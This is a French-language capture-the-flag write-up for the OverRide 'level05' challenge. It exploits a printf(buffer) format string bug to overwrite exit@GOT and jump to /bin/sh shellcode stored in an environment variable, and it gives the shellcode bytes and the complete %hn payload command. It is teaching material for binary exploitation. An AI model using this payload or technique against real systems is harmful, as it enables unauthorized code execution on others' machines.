# Exploitation format string (level05 - OverRide)

## Objectif

Obtenir un shell sur le binaire `level05` via une vulnérabilité de type **format string** en exploitant la fonction `printf(buffer)` et en réécrivant l'adresse de `exit@GOT` pour rediriger l'exécution vers notre shellcode injecté dans l'environnement.

---

## Analyse du binaire

Le programme lit une chaîne de caractères depuis l'entrée standard avec `fgets`, puis il passe cette chaîne directement à `printf` sans format string fixe :

```c
fgets(&buffer, 100, stdin);
printf(buffer);
exit(0);
```

Cette situation est typique d'une **vulnérabilité de format string**, permettant d'écrire à une adresse arbitraire en mémoire.

---

## Cibles d'écriture

La table GOT contient l'adresse de la fonction `exit` :

```
080497e0 R_386_JUMP_SLOT   exit
```

En modifiant cette entrée, on peut rediriger l'exécution de `exit()` vers un shellcode que l'on injecte préalablement.

---

## Shellcode

Le shellcode est injecté dans l'environnement via une variable `SC`. Exemple en bash :

```bash
export SC=$(python -c 'print("\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" + "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

L'adresse du shellcode a été repérée dans GDB :

```
0xffffdbf6
```

---

## Stratégie

On va utiliser la vulnérabilité format string pour écrire l'adresse `0xffffdbf6` à l'adresse `0x080497e0` (GOT de exit).

On coupe cette adresse en deux moitiés :

* Basse : `0xdbf6` (56310)
* Haute : `0xffff` (65535)

Et on l'écrit avec deux `%hn` successifs.

---

## Stack layout

Un test avec :

```bash
python -c 'print "AAAA %p %p %p %p %p %p %p %p %p %p %p"' | ./level05
```

Montre que l'input commence à l'index `%10$p`. Donc les adresses à écrire doivent être en première position dans l'input, suivies des format strings :

---

## Construction du payload

```python
(python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56302d%10$hn" + "%9225d%11$hn"'; cat)| ./level05
```

---

## Résultat attendu

* `exit()` sera redirigé vers `0xffffdbf6`
* Cette adresse correspond à notre shellcode dans l'environnement
* L'exécution du binaire terminera par un shell

---

## Conclusion

Ce challenge montre une **attaque de type format string** combinée à une **redirection de GOT** et l'utilisation de l'environnement pour injecter un shellcode.

C'est une technique classique de type `ret2env` / `GOT hijacking`, très pédagogique pour apprendre les fondamentaux de l'exploitation binaire.
